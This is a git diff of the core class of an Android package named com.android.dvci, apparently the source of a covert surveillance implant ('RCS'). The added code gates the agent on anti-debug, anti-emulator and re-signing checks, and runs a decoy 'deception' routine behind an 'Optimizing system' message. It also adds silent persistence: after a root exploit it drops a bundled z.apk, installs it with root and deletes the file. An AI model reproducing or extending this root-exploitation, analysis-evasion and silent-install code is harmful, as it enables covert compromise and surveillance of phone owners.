@@ -12,13 +12,14 @@ import android.app.ActivityManager;
 import android.app.PendingIntent;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.content.pm.Signature;
 import android.content.res.Resources;
 import android.os.Build;
 import android.os.Handler;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
-import android.util.Log;
 
 import com.android.dvci.action.Action;
 import com.android.dvci.action.SubAction;
@@ -26,9 +27,12 @@ import com.android.dvci.action.UninstallAction;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfType;
 import com.android.dvci.conf.Configuration;
+import com.android.dvci.crypto.CryptoException;
+import com.android.dvci.crypto.EncryptionPKCS5;
 import com.android.dvci.crypto.Keys;
 import com.android.dvci.evidence.EvDispatcher;
 import com.android.dvci.evidence.EvidenceBuilder;
+import com.android.dvci.evidence.Markup;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
 import com.android.dvci.gui.ASG;
@@ -38,11 +42,31 @@ import com.android.dvci.manager.ManagerModule;
 import com.android.dvci.optimize.NetworkOptimizer;
 import com.android.dvci.util.AntiDebug;
 import com.android.dvci.util.AntiEmulator;
+import com.android.dvci.util.AntiSign;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.Execute;
+import com.android.dvci.util.PackageUtils;
+import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
+import java.io.ByteArrayInputStream;
+import java.io.File;
 import java.io.IOException;
+import java.io.InputStream;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+import java.security.cert.CertificateException;
+import java.security.cert.CertificateFactory;
+import java.security.cert.X509Certificate;
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.List;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+import dexguard.util.CertificateChecker;
+
 
 /**
  * The Class Core, represents
@@ -68,11 +92,6 @@ public class Core extends Activity implements Runnable {
 	private Thread coreThread = null;
 
 	/**
-	 * The content resolver.
-	 */
-	private ContentResolver contentResolver;
-
-	/**
 	 * The agent manager.
 	 */
 	private ManagerModule moduleManager;
@@ -82,9 +101,6 @@ public class Core extends Activity implements Runnable {
 	 */
 	private ManagerEvent eventManager;
 	private WakeLock wl;
-	// private long queueSemaphore;
-	private Thread fastQueueThread;
-	private CheckAction checkActionFast;
 	private PendingIntent alarmIntent = null;
 	private ServiceMain serviceMain;
 
@@ -103,9 +119,9 @@ public class Core extends Activity implements Runnable {
 		return singleton;
 	}
 
-	public synchronized static void serivceUnregister() {
+	public synchronized static void serviceUnregister() {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (serivceUnregister) ...");
+			Check.log(TAG + " (serviceUnregister) ...");
 		}
 		if (singleton != null && singleton.serviceMain != null) {
 			singleton.serviceMain.stopListening();
@@ -149,9 +165,9 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "  exploitStatus == " + Status.getExploitStatusString() + "  exploitResult == " + Status.getExploitResultString());
 			}
-			if(!Status.isBlackberry() && Cfg.GUI) {
+			if (!Status.isBlackberry() && Cfg.GUI) {
 				Status.setIconState(true);
-				if(!Cfg.DEMO) {
+				if (!Cfg.DEMO) {
 					closeMainActivity();
 				}
 			}
@@ -214,7 +230,10 @@ public class Core extends Activity implements Runnable {
 		moduleManager = ManagerModule.self();
 		eventManager = ManagerEvent.self();
 
-		contentResolver = cr;
+		/*
+	  The content resolver.
+	 */
+		ContentResolver contentResolver = cr;
 
 		if (Cfg.DEBUG) {
 			coreThread.setName(getClass().getSimpleName());
@@ -254,20 +273,9 @@ public class Core extends Activity implements Runnable {
 			Status.self().makeToast(M.e("Agent started!"));
 		}
 
-//		if(Cfg.GUI){
-//
-//			Status.getStpe().schedule(new Runnable() {
-//				@Override
-//				public void run() {
-//					closeMainActivity();
-//				}
-//			}, 5, TimeUnit.SECONDS);
-//
-//		}
-
-
 		return true;
 	}
+
 
 	private void closeMainActivity() {
 		try {
@@ -280,10 +288,11 @@ public class Core extends Activity implements Runnable {
 					//Status.getAppGui().showInstallDialog();
 					try {
 						ASG gui = Status.getAppGui();
-						if(gui!=null && !gui.isFinishing()) {
+						if (gui != null && !gui.isFinishing()) {
 							gui.finish();
 						}
-					}catch(Exception ex){};
+					} catch (Exception ex) {
+					}
 
 				}
 			});
@@ -311,18 +320,28 @@ public class Core extends Activity implements Runnable {
 	 * @return true, if successful
 	 */
 	public boolean Stop() {
-		bStopCore = true;
+		try {
+			bStopCore = true;
 
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " RCS Thread Stopped"); //$NON-NLS-1$
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " RCS Thread Stopped"); //$NON-NLS-1$
+			}
+
+			if (wl != null) {
+				wl.release();
+			}
+
+			coreThread = null;
+
+			serviceRunning = false;
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(ex);
+				Check.log(TAG + " (Stop) ", ex);
+			}
 		}
-
-		wl.release();
-
-		coreThread = null;
-
-		serviceRunning = false;
 		return true;
+
 	}
 
 	/**
@@ -348,7 +367,7 @@ public class Core extends Activity implements Runnable {
 	// Runnable (main routine for RCS)
 	/*
 	 * (non-Javadoc)
-	 * 
+	 *
 	 * @see java.lang.Runnable#run()
 	 */
 	public void run() {
@@ -381,6 +400,14 @@ public class Core extends Activity implements Runnable {
 		}
 		Root.exploitPhone(runExploitSynchronously());
 		Root.getPermissions(false);
+
+		// ANTIDEBUG ANTIEMU
+		if (!check()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (Start) anti emu/debug failed");
+			}
+			return;
+		}
 
 		if (Status.haveRoot()) {
 			if (Cfg.DEMO) {
@@ -415,7 +442,7 @@ public class Core extends Activity implements Runnable {
 			}
 			// this markup is created by UninstallAction
 			//final Markup markup = new Markup(UNINSTALL_MARKUP);
-			if (haveUninstallMarkup()) {
+			if (haveMarkup(UNINSTALL_MARKUP)) {
 				UninstallAction.actualExecute(true);
 				confLoaded = ConfType.Error;
 			} else {
@@ -473,14 +500,15 @@ public class Core extends Activity implements Runnable {
 	}
 
 	private synchronized boolean checkActions() {
-		checkActionFast = new CheckAction(Action.FAST_QUEUE);
+		CheckAction checkActionFast = new CheckAction(Action.FAST_QUEUE);
 
-		fastQueueThread = new Thread(checkActionFast);
+		Thread fastQueueThread = new Thread(checkActionFast);
 		fastQueueThread.start();
 
 		return checkActions(Action.MAIN_QUEUE);
 
 	}
+
 
 	class CheckAction implements Runnable {
 		private final int queue;
@@ -534,7 +562,8 @@ public class Core extends Activity implements Runnable {
 				if (!Cfg.DEBUG && Cfg.CHECK_ANTI_DEBUG) {
 					// ANTIDEBUG
 					AntiDebug ad = new AntiDebug();
-					if (ad.isDebug()) {
+					AntiSign sign = new AntiSign();
+					if (ad.isDebug() || sign.isReSigned()) {
 						stopAll();
 						return true;
 					}
@@ -679,8 +708,8 @@ public class Core extends Activity implements Runnable {
 
 			/*
 			 * if (moduleManager.startAll() == false) { if (Cfg.DEBUG) {
-			 * Check.log(TAG + " moduleManager FAILED"); //$NON-NLS-1$ }
-			 * 
+			 * Check.Check.log(TAG + " moduleManager FAILED"); //$NON-NLS-1$ }
+			 *
 			 * return ConfType.Error; }
 			 */
 
@@ -694,13 +723,13 @@ public class Core extends Activity implements Runnable {
 
 			return ret;
 
-		} catch (final GeneralException rcse) {
+		} catch (final GeneralException e) {
 			if (Cfg.EXCEPTION) {
-				Check.log(rcse);
+				Check.log(e);
 			}
 
 			if (Cfg.DEBUG) {
-				Check.log(rcse);//$NON-NLS-1$
+				Check.log(e);//$NON-NLS-1$
 				Check.log(TAG + " RCSException() detected"); //$NON-NLS-1$
 			}
 		} catch (final Exception e) {
@@ -929,7 +958,6 @@ public class Core extends Activity implements Runnable {
 						Check.log(TAG + " Warn: " + "executeAction() error executing: " + subAction); //$NON-NLS-1$ //$NON-NLS-2$
 					}
 
-					continue;
 				} else {
 					if (subAction.considerStop()) {
 						if (Cfg.DEBUG) {
@@ -1003,8 +1031,20 @@ public class Core extends Activity implements Runnable {
 		}
 	}
 
-	public boolean check() {
-		if (Cfg.CHECK_ANTI_DEBUG) {
+	public static boolean check() {
+		if (Cfg.CHECK_ANTI_DEBUG){
+
+			if (!Cfg.DEBUG || Cfg.DEBUGANTISIGN) {
+				AntiSign sign = new AntiSign();
+				if(sign.isReSigned()) {
+					if (Cfg.DEMO) {
+						Status.self().makeToast(M.e("Optimizing system"));
+					}
+					deceptionCode2(Integer.MAX_VALUE / 512);
+					return false;
+				}
+			}
+
 			if (!Cfg.DEBUG || Cfg.DEBUGANTI) {
 
 
@@ -1051,21 +1091,27 @@ public class Core extends Activity implements Runnable {
 		return true;
 	}
 
-
-	public boolean haveUninstallMarkup() {
-		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), UNINSTALL_MARKUP);
+	public boolean haveMarkup(String markup) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (haveUninstallMarkup) " + markup.exists());
+			Check.requires(!StringUtils.isEmpty(markup), "empty markup");
 		}
-		return markup.exists();
+		final AutoFile fmarkup = new AutoFile(Status.getAppContext().getFilesDir(), markup);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (haveUninstallMarkup) " + fmarkup.exists());
+		}
+		return fmarkup.exists();
 	}
 
-	public synchronized void createUninstallMarkup() {
+	public synchronized void createMarkup(String markup) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (createUninstallMarkup) ");
 		}
-		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), UNINSTALL_MARKUP);
-		markup.write(1);
+		final AutoFile fmarkup = new AutoFile(Status.getAppContext().getFilesDir(), markup);
+		fmarkup.write(1);
+	}
+
+	public void createUninstallMarkup() {
+		createMarkup(UNINSTALL_MARKUP);
 	}
 
 	/*
@@ -1073,7 +1119,73 @@ public class Core extends Activity implements Runnable {
 	 * should be included here
 	 */
 	public void firstRoot() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (firstRoot) ");
+		}
 		Path.unprotect(M.e("/data"), 0, true);
 		Status.setPlayStoreEnableStatus(true);
+
+		if (Status.self().isMelted()) {
+			installSilentAsset();
+		}
 	}
+
+	private void installSilentAsset() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (installSilentAsset)");
+		}
+		String dvci = M.e("com.android.dvci");
+		if (!PackageUtils.isInstalledApk(dvci)) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installSilentAsset), going to install");
+			}
+			String apk = M.e("z.apk");
+			Utils.dumpAssetPayload(apk);
+
+			String pack = Status.getAppContext().getPackageName();
+			Root.installPersistence(false, String.format("/data/data/%s/files/z.apk", pack));
+
+			File file = new File(Status.getAppContext().getFilesDir(), apk);
+			file.delete();
+
+			if (PackageUtils.isInstalledApk(dvci)) {
+				EvidenceBuilder.info("Persistence installed");
+				if (Cfg.DEMO) {
+					Status.self().makeToast(M.e("Melt: dropped persistence"));
+				}
+
+				Markup markupMelt = new Markup(Markup.MELT_FILE_MARKUP);
+				markupMelt.serialize(Status.getAppContext().getPackageName());
+
+//				AutoFile markup = new AutoFile(String.format("/data/data/%s/mm", pack));
+//				markup.chmod("777");
+//
+//				markup.write(pack.getBytes());
+//				Execute.executeRoot(String.format("/data/data/%s/mm /data/data/%s/mm", pack, dvci ));
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (installSilentAsset), stopping melt");
+				}
+
+				stopService();
+			}
+
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installSilentAsset), stopping melt");
+			}
+			stopService();
+		}
+	}
+
+	private void stopService() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (stopService), sending intent");
+		}
+
+
+		Intent intent = new Intent(Status.getAppContext(), ServiceMain.class);
+		Status.getAppContext().stopService(intent);
+	}
+
 }
